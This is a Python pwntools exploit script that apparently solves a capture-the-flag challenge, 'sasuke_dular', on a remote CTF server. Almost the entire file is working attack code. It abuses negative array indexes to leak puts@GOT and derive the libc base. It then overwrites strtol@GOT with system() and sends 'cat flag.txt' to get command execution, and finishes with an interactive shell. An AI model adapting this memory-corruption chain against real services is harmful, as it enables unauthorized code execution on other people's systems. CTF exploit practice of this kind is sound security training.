#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'pwn.runa2025.kr'
PORT = 7004

def connect():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process('./sasuke_dular')

def show(p, day):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', str(day).encode())

def register(p, day, start, end, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', str(day).encode())
    p.sendlineafter(b':', str(start).encode())
    p.sendlineafter(b':', str(end).encode())
    p.sendafter(b':', data)

def main():
    p = connect()
    p.timeout = 5  # Increase timeout
    
    # Step 1: Leak libc address from GOT
    # puts@GOT = 0x405008, g_names = 0x4050a0
    # offset = -152 = -2 * 88 + (11-8)*8
    log.info("Leaking libc address from puts@GOT...")
    show(p, -2)
    
    # Receive ALL schedule output - wait longer
    time.sleep(1)
    data = b''
    while b'>' not in data:
        chunk = p.recv(timeout=2)
        if not chunk:
            break
        data += chunk
    log.debug(f"Received {len(data)} bytes")
    #log.debug(f"First 1000 bytes: {data[:1000]}")
    
    # Find "11:00-12:00 " and extract 8 bytes after it
    marker = b'11:00-12:00 '
    idx = data.find(marker)
    if idx == -1:
        log.error(f"Could not find leak marker. Data preview:\n{data[:500]}")
        p.close()
        return
    
    leaked_bytes = data[idx + len(marker):idx + len(marker) + 8]
    puts_addr = u64(leaked_bytes)
    log.success(f"Leaked puts@libc: {hex(puts_addr)}")
    
    # Calculate libc base (puts offset = 0x87be0)
    libc_base = puts_addr - 0x87be0
    log.success(f"libc base: {hex(libc_base)}")
    
    # Calculate system address
    system_addr = libc_base + 0x58750
    log.info(f"system: {hex(system_addr)}")
    
    # Step 2: Overwrite strtol@GOT with system
    # strtol@GOT = 0x405048
    # offset from g_names = 0x405048 - 0x4050a0 = -88
    # -88 = -1 * 88 + (hour-8)*8 → hour=8
    log.info("Overwriting strtol@GOT with system...")
    
    # Send register command
    p.send(b'1\n')
    p.sendlineafter(b':', b'-1')
    p.sendlineafter(b':', b'8')
    p.sendlineafter(b':', b'9')
    p.sendafter(b':', p64(system_addr))
    
    # Step 3: Trigger strtol by sending a shell command
    log.success("strtol is now system! Sending shell command...")
    
    p.recv(timeout=1)  # Drain buffer
    p.sendline(b'cat flag.txt')  # Execute cat directly!
    
    # We should now have a shell!
    log.success("Shell should be spawned!")
    
    # Receive the flag
    time.sleep(1)
    output = p.recv(timeout=3)
    log.success(f"Output:\n{output.decode()}")
    
    p.interactive()

if __name__ == '__main__':
    main()
